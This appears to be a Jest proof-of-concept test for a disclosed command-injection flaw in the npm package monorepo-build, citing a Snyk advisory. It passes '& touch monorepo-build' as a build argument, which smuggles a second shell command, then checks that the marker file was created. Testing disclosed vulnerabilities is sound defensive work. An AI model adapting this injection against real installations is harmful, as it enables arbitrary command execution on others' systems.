//https://snyk.io/vuln/SNYK-JS-MONOREPOBUILD-1050392
test("Command Injection in monorepo-build", () => {
  var a = require("monorepo-build");
  const fs = require("fs");
  const path = "./monorepo-build";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    a.build("./", "& touch monorepo-build");
  } catch (error) {
    console.log("syntax-error");
  }

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
